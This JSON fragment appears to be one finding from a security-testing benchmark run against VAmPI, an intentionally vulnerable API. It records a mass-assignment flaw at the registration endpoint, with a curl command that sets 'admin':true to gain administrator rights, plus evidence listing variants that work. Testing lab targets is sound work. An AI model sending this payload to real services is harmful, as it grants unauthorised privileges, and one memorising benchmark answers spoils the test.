      "severity": "CRITICAL",
      "resource": "/users/v1/register",
      "command": "curl -X POST http://vuln-vampi:5000/users/v1/register -d '{\"username\":\"hacker1\",\"password\":\"hackpass\",\"email\":\"hacker@evil.com\",\"admin\":true}'",
      "evidence": "Verified via _debug: hacker1 has admin:true. Multiple variants work: boolean, integer 1, string 'yes'",
      "gt_match": "vampi-mass-assign-006"
